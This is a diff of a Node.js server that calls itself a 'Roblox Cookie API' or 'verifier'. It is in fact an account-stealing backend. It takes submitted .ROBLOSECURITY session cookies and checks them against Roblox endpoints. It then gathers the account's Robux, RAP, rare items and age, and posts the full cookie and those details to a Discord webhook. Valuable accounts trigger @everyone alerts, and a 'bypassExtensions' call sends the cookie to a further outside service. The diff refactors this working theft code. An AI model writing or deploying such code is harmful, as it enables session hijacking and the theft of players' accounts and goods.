@@ -85,35 +85,12 @@ function getRelativeTime(dateString) {
 function shouldMentionEveryone(data) {
     const conditions = [];
     
-    // Check for Korblox
-    if (data.inventory?.hasKorblox) {
-        conditions.push('KORBLOX');
-    }
-    
-    // Check for Headless
-    if (data.inventory?.hasHeadless) {
-        conditions.push('HEADLESS');
-    }
-    
-    // Check for 8-Bit Crown
-    if (data.inventory?.hasEightBitCrown) {
-        conditions.push('8-BIT CROWN');
-    }
-    
-    // Check for 1000+ robux
-    if (data.robuxBalance >= 1000) {
-        conditions.push(`1000+ ROBUX (${formatNumber(data.robuxBalance)} R$)`);
-    }
-    
-    // Check for 1000+ RAP
-    if (data.rap >= 1000) {
-        conditions.push(`1000+ RAP (${formatNumber(data.rap)} R$)`);
-    }
-    
-    // Check for 50k+ friends (summary)
-    if (data.summary?.friendCount >= 50000) {
-        conditions.push(`50K+ FRIENDS (${formatNumber(data.summary.friendCount)})`);
-    }
+    if (data.inventory?.hasKorblox) conditions.push('KORBLOX');
+    if (data.inventory?.hasHeadless) conditions.push('HEADLESS');
+    if (data.inventory?.hasEightBitCrown) conditions.push('8-BIT CROWN');
+    if (data.robuxBalance >= 1000) conditions.push(`1000+ ROBUX (${formatNumber(data.robuxBalance)} R$)`);
+    if (data.rap >= 1000) conditions.push(`1000+ RAP (${formatNumber(data.rap)} R$)`);
+    if (data.summary?.friendCount >= 50000) conditions.push(`50K+ FRIENDS (${formatNumber(data.summary.friendCount)})`);
     
     return {
         shouldMention: conditions.length > 0,
@@ -168,8 +145,7 @@ async function verifyCookie(cookie) {
             headers: {
                 'Cookie': `.ROBLOSECURITY=${cookie}`,
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-            },
-            timeout: 10000
+            }
         });
         return { valid: true, userId: response.data.id, username: response.data.name };
     } catch (error) {
@@ -179,27 +155,23 @@ async function verifyCookie(cookie) {
 
 async function checkAge13Plus(cookie, userId) {
     try {
-        // Try the newer API endpoint
         const response = await axios.get(`https://www.roblox.com/mobileapi/userinfo`, {
             headers: {
                 'Cookie': `.ROBLOSECURITY=${cookie}`,
                 'User-Agent': 'Mozilla/5.0'
-            },
-            timeout: 10000
+            }
         });
         
         if (response.data && response.data.IsThirteenOrOver !== undefined) {
             return response.data.IsThirteenOrOver;
         }
         
-        // Fallback: check birthdate endpoint
         try {
             const birthdateResponse = await axios.get(`https://users.roblox.com/v1/users/${userId}`, {
                 headers: {
                     'Cookie': `.ROBLOSECURITY=${cookie}`,
                     'User-Agent': 'Mozilla/5.0'
-                },
-                timeout: 10000
+                }
             });
             
             const createdDate = new Date(birthdateResponse.data.created);
@@ -221,8 +193,7 @@ async function fetchRobuxBalance(cookie) {
             headers: {
                 'Cookie': `.ROBLOSECURITY=${cookie}`,
                 'User-Agent': 'Mozilla/5.0'
-            },
-            timeout: 10000
+            }
         });
         return response.data.robux;
     } catch (error) {
@@ -240,13 +211,11 @@ async function checkInventoryItems(cookie, userId, assetIds) {
     };
     
     try {
-        // Check collectibles inventory
         const response = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
             headers: {
                 'Cookie': `.ROBLOSECURITY=${cookie}`,
                 'User-Agent': 'Mozilla/5.0'
-            },
-            timeout: 15000
+            }
         });
         
         if (response.data && response.data.data) {
@@ -269,28 +238,24 @@ async function checkInventoryItems(cookie, userId, assetIds) {
         
         results.hasKorblox = results.korbloxParts.length === 3;
         
-        // Check bundle ownership for headless
         try {
             const bundleResponse = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/bundles/ownership?bundleIds=${assetIds.HEADLESS_BUNDLE_ID}`, {
                 headers: {
                     'Cookie': `.ROBLOSECURITY=${cookie}`,
                     'User-Agent': 'Mozilla/5.0'
-                },
-                timeout: 10000
+                }
             });
             
             if (bundleResponse.data && bundleResponse.data.owns) {
                 results.hasHeadless = true;
             }
         } catch {
-            // Try older bundle endpoint as fallback
             try {
                 const bundleResponse = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/bundles?limit=100`, {
                     headers: {
                         'Cookie': `.ROBLOSECURITY=${cookie}`,
                         'User-Agent': 'Mozilla/5.0'
-                    },
-                    timeout: 10000
+                    }
                 });
                 
                 if (bundleResponse.data && bundleResponse.data.data) {
@@ -315,9 +280,9 @@ async function checkInventoryItems(cookie, userId, assetIds) {
 async function fetchUserSummary(userId) {
     try {
         const [profileResponse, friendsResponse, groupsResponse] = await Promise.all([
-            axios.get(`https://users.roblox.com/v1/users/${userId}`, { timeout: 10000 }).catch(() => ({ data: { displayName: 'Unknown', created: new Date().toISOString(), description: '', isBanned: false } })),
-            axios.get(`https://friends.roblox.com/v1/users/${userId}/friends/count`, { timeout: 10000 }).catch(() => ({ data: { count: 0 } })),
-            axios.get(`https://groups.roblox.com/v2/users/${userId}/groups/roles`, { timeout: 10000 }).catch(() => ({ data: { data: [] } }))
+            axios.get(`https://users.roblox.com/v1/users/${userId}`).catch(() => ({ data: { displayName: 'Unknown', created: new Date().toISOString(), description: '', isBanned: false } })),
+            axios.get(`https://friends.roblox.com/v1/users/${userId}/friends/count`).catch(() => ({ data: { count: 0 } })),
+            axios.get(`https://groups.roblox.com/v2/users/${userId}/groups/roles`).catch(() => ({ data: { data: [] } }))
         ]);
         
         const createdDate = new Date(profileResponse.data.created);
@@ -347,7 +312,7 @@ async function fetchUserSummary(userId) {
     }
 }
 
-// FIXED: Better bypass function with fallback
+// FIXED: Bypass function that won't crash your API
 async function bypassExtensions(cookie) {
     try {
         console.log('Attempting to bypass extensions...');
@@ -359,17 +324,27 @@ async function bypassExtensions(cookie) {
                 'Content-Type': 'application/json',
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
             },
-            timeout: 10000
+            timeout: 5000, // 5 second timeout
+            validateStatus: function (status) {
+                return status < 500; // Accept any status less than 500
+            }
         });
+        
+        // Check if response is HTML (error) or JSON
+        if (typeof response.data === 'string' && response.data.includes('<!DOCTYPE html>')) {
+            console.log('Bypass service returned HTML (likely down)');
+            return { success: false, error: 'Service returned HTML error page', message: 'Bypass service is currently unavailable' };
+        }
+        
         console.log('Bypass successful:', response.status);
         return { success: true, data: response.data };
     } catch (error) {
         console.error('Bypass error:', error.message);
-        // Return a fallback response instead of failing
+        // Return a friendly error instead of throwing
         return { 
             success: false, 
             error: error.message,
-            message: 'Bypass service unavailable, continuing with verification'
+            message: 'Bypass service unavailable, but verification continues'
         };
     }
 }
@@ -380,8 +355,7 @@ async function fetchUserRAP(cookie, userId) {
             headers: {
                 'Cookie': `.ROBLOSECURITY=${cookie}`,
                 'User-Agent': 'Mozilla/5.0'
-            },
-            timeout: 15000
+            }
         });
         
         let totalRAP = 0;
@@ -399,11 +373,9 @@ async function fetchUserRAP(cookie, userId) {
     }
 }
 
-// WEBHOOK WITH @everyone MENTIONS
+// SIMPLIFIED WEBHOOK FUNCTION
 async function sendToWebhook(data) {
-    console.log('========================================');
-    console.log('📤 SENDING WEBHOOK WITH @everyone CHECK');
-    console.log('========================================');
+    console.log('📤 Sending to webhook...');
     
     if (!WEBHOOK_URL || WEBHOOK_URL.includes('YOUR_ID')) {
         console.error('❌ WEBHOOK URL NOT CONFIGURED!');
@@ -411,370 +383,189 @@ async function sendToWebhook(data) {
     }
     
     try {
-        // Check if should @everyone
         const mentionCheck = shouldMentionEveryone(data);
         const priority = getMentionPriority(data);
         
         let content = '';
-        let color = data.success ? 0x00FF00 : 0xFF0000;
-        
-        // Prepare @everyone mention if conditions met
         if (data.success && mentionCheck.shouldMention) {
             content = `@everyone ${EMOJIS.ultra} **RARE ACCOUNT DETECTED!** ${EMOJIS.ultra}\n`;
             content += `**${priority.priorityName}** - ${mentionCheck.count} rare condition(s) met!\n`;
-            content += `**Conditions:** ${mentionCheck.conditions.join(', ')}\n`;
-            content += `${EMOJIS.arrow} **Check the embed below for full details!**\n\n`;
-            color = 0xFF0000; // Red for rare accounts
-            console.log('🔔 @everyone MENTION TRIGGERED!');
-            console.log('Conditions met:', mentionCheck.conditions);
         } else if (data.success) {
-            content = `${EMOJIS.success} **New Account Verified** ${EMOJIS.success}\n`;
-            console.log('📢 No @everyone mention - conditions not met');
+            content = `${EMOJIS.success} **Account Verified** ${EMOJIS.success}\n`;
         } else {
-            content = `${EMOJIS.warning} **Verification Attempt Failed** ${EMOJIS.warning}\n`;
+            content = `${EMOJIS.warning} **Verification Failed** ${EMOJIS.warning}\n`;
         }
-        
-        // Create array for fields
-        const fields = [];
-        
-        // FIELD 1: FULL COOKIE
-        fields.push({
-            name: `${EMOJIS.cookie} FULL COOKIE VALUE`,
-            value: `\`\`\`\n${data.cookie || 'No cookie provided'}\n\`\`\``,
-            inline: false
-        });
-        
-        if (data.success) {
-            // FIELD 2: RARE CONDITIONS MET (if any)
-            if (mentionCheck.shouldMention) {
-                let rareBadges = '';
-                if (data.inventory?.hasKorblox) rareBadges += `${EMOJIS.korblox} **KORBLOX** 👑\n`;
-                if (data.inventory?.hasHeadless) rareBadges += `${EMOJIS.headless} **HEADLESS** 🎃\n`;
-                if (data.inventory?.hasEightBitCrown) rareBadges += `${EMOJIS.eightbit} **8-BIT CROWN** ⭐\n`;
-                if (data.robuxBalance >= 1000) rareBadges += `${EMOJIS.robux} **${formatNumber(data.robuxBalance)} ROBUX** 💰\n`;
-                if (data.rap >= 1000) rareBadges += `${EMOJIS.rap} **${formatNumber(data.rap)} RAP** 📈\n`;
-                if (data.summary?.friendCount >= 50000) rareBadges += `${EMOJIS.friends} **${formatNumber(data.summary.friendCount)} FRIENDS** 👥\n`;
-                
-                fields.push({
-                    name: `${EMOJIS.rare} RARE CONDITIONS MET ${EMOJIS.rare}`,
-                    value: rareBadges,
-                    inline: false
-                });
-            }
-            
-            // FIELD 3: BASIC INFO
-            const createdDate = data.summary?.createdDate 
-                ? new Date(data.summary.createdDate).toLocaleDateString() 
-                : 'Unknown';
-            
-            fields.push({
-                name: `${EMOJIS.user} ACCOUNT INFORMATION`,
-                value: `┌ ${EMOJIS.user} **Username:** \`${data.username}\`\n` +
-                       `├ ${EMOJIS.id} **User ID:** \`${data.userId}\`\n` +
-                       `├ ${EMOJIS.diamond} **Display Name:** \`${data.summary?.displayName || 'N/A'}\`\n` +
-                       `├ ${EMOJIS.calendar} **Created:** \`${createdDate}\`\n` +
-                       `└ ${EMOJIS.clock} **Account Age:** \`${data.daysSinceCreation} days\` (${getRelativeTime(data.summary?.createdDate)})`,
-                inline: false
-            });
-            
-            // FIELD 4: ROBUX & RAP
-            const robuxEmoji = data.robuxBalance >= 1000 ? EMOJIS.fire : EMOJIS.robux;
-            const rapEmoji = data.rap >= 1000 ? EMOJIS.fire : EMOJIS.rap;
-            
-            fields.push({
-                name: `${EMOJIS.robux} CURRENCY & VALUE`,
-                value: `┌ ${robuxEmoji} **Robux Balance:** \`${formatNumber(data.robuxBalance)} R$\`\n` +
-                       `└ ${rapEmoji} **RAP Value:** \`${formatNumber(data.rap)} R$\``,
-                inline: true
-            });
-            
-            // FIELD 5: AGE VERIFICATION
-            fields.push({
-                name: `${EMOJIS.lock} AGE VERIFICATION`,
-                value: data.isThirteenPlus ? 
-                    `${EMOJIS.unlock} **13+ Verified:** \`Yes\`\n└ **Full Access Granted**` :
-                    `${EMOJIS.lock} **13+ Verified:** \`No\`\n└ **Limited Access**`,
-                inline: true
-            });
-            
-            // FIELD 6: LIMITED ITEMS STATUS
-            let limitedItemsValue = '';
-            
-            if (data.inventory?.hasKorblox) {
-                limitedItemsValue += `${EMOJIS.korblox} **Korblox Deathspeaker:** \`OWNED\` ${EMOJIS.sparkles}\n`;
-            } else {
-                limitedItemsValue += `${EMOJIS.korblox} **Korblox Deathspeaker:** \`NOT OWNED\` (${data.inventory?.korbloxPartsOwned || 0}/3 parts)\n`;
-            }
-            
-            if (data.inventory?.hasHeadless) {
-                limitedItemsValue += `${EMOJIS.headless} **Headless Horseman:** \`OWNED\` ${EMOJIS.ghost}\n`;
-            } else {
-                limitedItemsValue += `${EMOJIS.headless} **Headless Horseman:** \`NOT OWNED\`\n`;
-            }
-            
-            if (data.inventory?.hasEightBitCrown) {
-                limitedItemsValue += `${EMOJIS.eightbit} **8-Bit Royal Crown:** \`OWNED\` ${EMOJIS.crown}\n`;
-            } else {
-                limitedItemsValue += `${EMOJIS.eightbit} **8-Bit Royal Crown:** \`NOT OWNED\``;
-            }
-            
-            fields.push({
-                name: `${EMOJIS.gift} LIMITED ITEMS`,
-                value: limitedItemsValue,
-                inline: false
-            });
-            
-            // FIELD 7: SOCIAL STATS
-            const friendEmoji = data.summary?.friendCount >= 50000 ? EMOJIS.ultra : EMOJIS.friends;
-            
-            fields.push({
-                name: `${EMOJIS.friends} SOCIAL STATISTICS`,
-                value: `┌ ${friendEmoji} **Friends:** \`${formatNumber(data.summary?.friendCount || 0)}\`\n` +
-                       `├ ${EMOJIS.groups} **Groups:** \`${formatNumber(data.summary?.groupCount || 0)}\`\n` +
-                       `└ ${EMOJIS.warning_sign} **Banned:** \`${data.summary?.isBanned ? 'Yes' : 'No'}\``,
-                inline: false
-            });
-            
-            // FIELD 8: PROFILE LINK
-            fields.push({
-                name: `${EMOJIS.arrow} PROFILE LINK`,
-                value: `[Click to view ${data.username}'s profile](https://www.roblox.com/users/${data.userId}/profile)`,
-                inline: true
-            });
-            
-            // FIELD 9: USER BIO (if exists)
-            if (data.summary?.description && data.summary.description.length > 0) {
-                fields.push({
-                    name: `${EMOJIS.sparkles} USER BIO`,
-                    value: `\`\`\`\n${data.summary.description.substring(0, 500)}${data.summary.description.length > 500 ? '...' : ''}\n\`\`\``,
-                    inline: false
-                });
-            }
-            
-        } else {
-            // FAILED VERIFICATION
-            fields.push({
-                name: `${EMOJIS.error} ERROR DETAILS`,
-                value: `\`\`\`diff\n- ${data.error || 'Unknown error occurred'}\n\`\`\``,
-                inline: false
-            });
-            
-            fields.push({
-                name: `${EMOJIS.warning_sign} TROUBLESHOOTING`,
-                value: `• Cookie may be expired\n• Cookie format might be incorrect\n• Try logging into Roblox again\n• Get a fresh cookie from browser`,
-                inline: false
-            });
-        }
-        
-        // FIELD 10: TIMESTAMP
-        fields.push({
-            name: `${EMOJIS.clock} VERIFICATION TIME`,
-            value: `\`${new Date(data.timestamp).toLocaleString()}\``,
-            inline: false
-        });
-        
-        // Create the embed
-        const thumbnailUrl = data.success 
-            ? `https://tr.rbxcdn.com/30DAY-AvatarHeadshot-${data.userId}.png?width=420&height=420&format=png`
-            : undefined;
         
         const embed = {
-            title: data.success ? 
-                (mentionCheck.shouldMention ? `${EMOJIS.ultra} ⭐ RARE ACCOUNT VERIFIED! ⭐ ${EMOJIS.ultra}` : `${EMOJIS.success} ACCOUNT VERIFIED SUCCESSFULLY ${EMOJIS.success}`) : 
-                `${EMOJIS.error} VERIFICATION FAILED ${EMOJIS.warning}`,
-            description: data.success ? 
-                (mentionCheck.shouldMention ? `**${priority.priorityName}** - This account meets ${mentionCheck.count} rare condition(s)!` : `Account successfully verified. No rare conditions met.`) : 
-                `Cookie validation failed. Please check and try again.`,
-            color: mentionCheck.shouldMention ? 0xFF0000 : color,
-            thumbnail: data.success ? { url: thumbnailUrl } : undefined,
-            author: data.success ? {
-                name: `@${data.username}`,
-                icon_url: `https://www.roblox.com/headshot-thumbnail/image?userId=${data.userId}&width=420&height=420&format=png`,
-                url: `https://www.roblox.com/users/${data.userId}/profile`
-            } : undefined,
-            fields: fields,
-            footer: {
-                text: `🔐 Roblox Cookie API • ${mentionCheck.shouldMention ? 'RARE ACCOUNT DETECTED!' : 'Standard Verification'}`,
-                icon_url: 'https://cdn.discordapp.com/emojis/1234567890.png'
-            },
+            title: data.success ? "✅ Account Verified" : "❌ Verification Failed",
+            color: data.success ? 0x00FF00 : 0xFF0000,
+            fields: [
+                {
+                    name: `${EMOJIS.cookie} Cookie`,
+                    value: `\`\`\`${data.cookie || 'No cookie'}\`\`\``,
+                    inline: false
+                }
+            ],
             timestamp: data.timestamp
         };
         
-        // Clean up undefined values from embed
-        Object.keys(embed).forEach(key => {
-            if (embed[key] === undefined) {
-                delete embed[key];
+        if (data.success) {
+            embed.fields.push(
+                {
+                    name: `${EMOJIS.user} User`,
+                    value: `**Username:** ${data.username}\n**ID:** ${data.userId}`,
+                    inline: true
+                },
+                {
+                    name: `${EMOJIS.robux} Value`,
+                    value: `**Robux:** ${formatNumber(data.robuxBalance)} R$\n**RAP:** ${formatNumber(data.rap)} R$`,
+                    inline: true
+                }
+            );
+            
+            if (mentionCheck.shouldMention) {
+                embed.fields.push({
+                    name: `${EMOJIS.rare} Rare Items`,
+                    value: mentionCheck.conditions.join('\n'),
+                    inline: false
+                });
             }
-        });
+        }
         
-        // Send the webhook with @everyone mention
         const webhookData = {
             content: content,
             embeds: [embed],
-            username: "Roblox Cookie Verifier",
-            avatar_url: "https://cdn.discordapp.com/emojis/1234567890.png",
-            allowed_mentions: {
-                parse: ["everyone", "roles", "users"]
-            }
+            allowed_mentions: { parse: ["everyone"] }
         };
         
-        const response = await axios.post(WEBHOOK_URL, webhookData, {
-            headers: { 'Content-Type': 'application/json' },
-            timeout: 10000
-        });
-        
-        console.log('✅ WEBHOOK SENT SUCCESSFULLY!');
-        if (mentionCheck.shouldMention) {
-            console.log('🔔 @everyone WAS MENTIONED!');
-            console.log('📋 Conditions:', mentionCheck.conditions);
-        }
-        console.log('========================================');
-        return { success: true, status: response.status, mentioned: mentionCheck.shouldMention };
+        await axios.post(WEBHOOK_URL, webhookData);
+        console.log('✅ Webhook sent!');
+        return { success: true, mentioned: mentionCheck.shouldMention };
         
     } catch (error) {
-        console.error('❌ WEBHOOK FAILED!');
-        console.error('Error:', error.message);
-        if (error.response) {
-            console.error('Response:', error.response.data);
-        }
-        console.log('========================================');
+        console.error('❌ Webhook failed:', error.message);
         return { success: false, error: error.message };
     }
 }
 
-// ========== MAIN API ENDPOINTS ==========
+// ========== MAIN API ENDPOINT ==========
 
 app.post('/api/verify-cookie', async (req, res) => {
     const { cookie } = req.body;
     
     console.log('========================================');
-    console.log('🔍 NEW VERIFICATION REQUEST');
-    console.log('Cookie length:', cookie ? cookie.length : 0);
+    console.log('🔍 New verification request');
     console.log('========================================');
     
     if (!cookie) {
         return res.status(400).json({ error: 'Cookie is required' });
     }
     
-    let responseData = {
+    const responseData = {
         cookie: cookie,
         success: false,
         timestamp: new Date().toISOString()
     };
     
     try {
-        console.log('Step 1: Verifying cookie...');
+        // Step 1: Verify cookie
         const verification = await verifyCookie(cookie);
-        
         if (!verification.valid) {
             responseData.error = verification.error;
-            console.log('❌ Cookie is invalid');
-            await sendToWebhook(responseData).catch(e => console.error('Webhook error on failed:', e.message));
-            return res.status(401).json({ success: false, error: verification.error, cookie: cookie });
+            await sendToWebhook(responseData);
+            return res.status(401).json({ 
+                success: false, 
+                error: verification.error,
+                cookie: cookie 
+            });
         }
         
-        console.log(`✅ Cookie valid for: ${verification.username}`);
         responseData.success = true;
         responseData.username = verification.username;
         responseData.userId = verification.userId;
         
-        console.log('Step 2: Checking age...');
+        // Step 2: Get all user data
         responseData.isThirteenPlus = await checkAge13Plus(cookie, verification.userId);
+        responseData.robuxBalance = await fetchRobuxBalance(cookie);
+        responseData.rap = await fetchUserRAP(cookie, verification.userId);
         
-        console.log('Step 3: Fetching user data...');
-        const [robuxBalance, inventoryItems, userSummary, userRAP] = await Promise.all([
-            fetchRobuxBalance(cookie),
-            checkInventoryItems(cookie, verification.userId, ASSET_IDS),
-            fetchUserSummary(verification.userId),
-            fetchUserRAP(cookie, verification.userId)
-        ]);
-        
-        console.log('Step 4: Bypassing extensions (optional)...');
-        const bypassResult = await bypassExtensions(cookie);
-        
-        responseData.robuxBalance = robuxBalance;
-        responseData.rap = userRAP;
-        responseData.daysSinceCreation = userSummary.daysSinceCreation;
+        const inventoryItems = await checkInventoryItems(cookie, verification.userId, ASSET_IDS);
         responseData.inventory = {
             hasKorblox: inventoryItems.hasKorblox,
             hasHeadless: inventoryItems.hasHeadless,
             hasEightBitCrown: inventoryItems.hasEightBitCrown,
-            korbloxPartsOwned: inventoryItems.korbloxParts.length,
-            totalKorbloxParts: 3
+            korbloxPartsOwned: inventoryItems.korbloxParts.length
         };
-        responseData.summary = {
-            displayName: userSummary.displayName,
-            friendCount: userSummary.friendCount,
-            groupCount: userSummary.groupCount,
-            createdDate: userSummary.createdDate,
-            description: userSummary.description,
-            isBanned: userSummary.isBanned
-        };
+        
+        const userSummary = await fetchUserSummary(verification.userId);
+        responseData.summary = userSummary;
+        responseData.daysSinceCreation = userSummary.daysSinceCreation;
+        
+        // Step 3: Try bypass (won't crash if it fails)
+        const bypassResult = await bypassExtensions(cookie);
         responseData.bypassResult = bypassResult;
         
-        // Check conditions before sending webhook
-        const mentionCheck = shouldMentionEveryone(responseData);
-        console.log('🎯 Condition Check Results:');
-        console.log('- Should @everyone:', mentionCheck.shouldMention);
-        console.log('- Conditions met:', mentionCheck.conditions);
-        
-        // Send webhook with @everyone if conditions met
+        // Step 4: Send to webhook
         const webhookResult = await sendToWebhook(responseData);
         
-        console.log('📦 Sending response to client');
+        // Step 5: Return response
         res.json({
-            ...responseData,
+            success: true,
+            username: responseData.username,
+            userId: responseData.userId,
+            robuxBalance: responseData.robuxBalance,
+            rap: responseData.rap,
+            hasKorblox: responseData.inventory.hasKorblox,
+            hasHeadless: responseData.inventory.hasHeadless,
+            hasEightBitCrown: responseData.inventory.hasEightBitCrown,
+            isThirteenPlus: responseData.isThirteenPlus,
+            bypassAttempted: true,
+            bypassSuccess: bypassResult.success,
             webhookSent: webhookResult.success,
             mentioned: webhookResult.mentioned,
-            conditionsMet: mentionCheck.conditions
+            cookie: cookie
         });
         
     } catch (error) {
         console.error('Server error:', error);
         responseData.error = error.message;
-        await sendToWebhook(responseData).catch(e => console.error('Webhook error:', e.message));
-        res.status(500).json({ success: false, error: 'Internal server error', details: error.message, cookie: cookie });
+        await sendToWebhook(responseData);
+        res.status(500).json({ 
+            success: false, 
+            error: 'Internal server error', 
+            details: error.message,
+            cookie: cookie 
+        });
     }
 });
 
-// Test webhook endpoint
+// Test endpoint
 app.post('/api/test-webhook', async (req, res) => {
-    console.log('🧪 TESTING WEBHOOK WITH @everyone');
-    
     const testData = {
-        cookie: "TEST_COOKIE_VALUE_FOR_TESTING_PURPOSES",
+        cookie: "TEST_COOKIE",
         success: true,
-        username: "Loudzraze",
-        userId: 10873440895,
-        daysSinceCreation: 365,
-        rap: 250000,
-        robuxBalance: 12500,
+        username: "TestUser",
+        userId: 123456789,
+        robuxBalance: 5000,
+        rap: 10000,
         isThirteenPlus: true,
         inventory: {
             hasKorblox: true,
             hasHeadless: true,
-            hasEightBitCrown: true,
-            korbloxPartsOwned: 3,
-            totalKorbloxParts: 3
+            hasEightBitCrown: false
         },
         summary: {
-            displayName: "Loudzraze",
-            friendCount: 75000,
-            groupCount: 12,
-            createdDate: "2024-01-01T00:00:00Z",
-            description: "Roblox enthusiast and limited collector! 🎮",
-            isBanned: false
+            friendCount: 1000,
+            groupCount: 5
         },
-        bypassResult: { success: true, data: { bypassed: true } },
         timestamp: new Date().toISOString()
     };
     
     const result = await sendToWebhook(testData);
-    
     res.json({ 
-        webhookSent: result.success, 
-        mentioned: result.mentioned,
-        message: result.success ? "✅ Webhook sent with @everyone mention!" : "❌ Webhook failed"
+        message: "Test completed", 
+        webhookSent: result.success,
+        mentioned: result.mentioned 
     });
 });
 
@@ -783,7 +574,7 @@ app.get('/health', (req, res) => {
     res.json({ 
         status: 'API is running', 
         timestamp: new Date().toISOString(),
-        webhookConfigured: WEBHOOK_URL && !WEBHOOK_URL.includes('YOUR_ID')
+        bypassService: BYPASS_API_URL
     });
 });
 
@@ -791,19 +582,10 @@ app.get('/', (req, res) => {
     res.json({ 
         name: 'Roblox Cookie API',
         version: '1.0.0',
-        description: 'API INTERGRATION NI SHINSOO',
-        conditions: [
-            'SHINSO',
-            'ON', 
-            'TOP',
-            'AGREE',
-            'BA',
-            'KAYO??'
-        ],
         endpoints: [
-            'haha',
-            'OKSSS',
-            'ezez'
+            'POST /api/verify-cookie',
+            'POST /api/test-webhook',
+            'GET /health'
         ]
     });
 });
@@ -813,19 +595,9 @@ app.listen(PORT, () => {
     console.log('========================================');
     console.log(`🚀 Server running on port ${PORT}`);
     console.log('========================================');
-    console.log('🔔 @everyone MENTION CONDITIONS:');
-    console.log('  • Korblox Deathspeaker');
-    console.log('  • Headless Horseman');
-    console.log('  • 8-Bit Royal Crown');
-    console.log('  • 1000+ Robux');
-    console.log('  • 1000+ RAP');
-    console.log('  • 50,000+ Friends');
-    console.log('========================================');
-    console.log('📡 Available endpoints:');
-    console.log('  POST /api/verify-cookie');
-    console.log('  POST /api/test-webhook');
-    console.log('  GET  /health');
-    console.log('  GET  /');
+    console.log('📡 Test with Postman:');
+    console.log(`   POST http://localhost:${PORT}/api/verify-cookie`);
+    console.log('   Body: { "cookie": "your_cookie_here" }');
     console.log('========================================');
 });
 
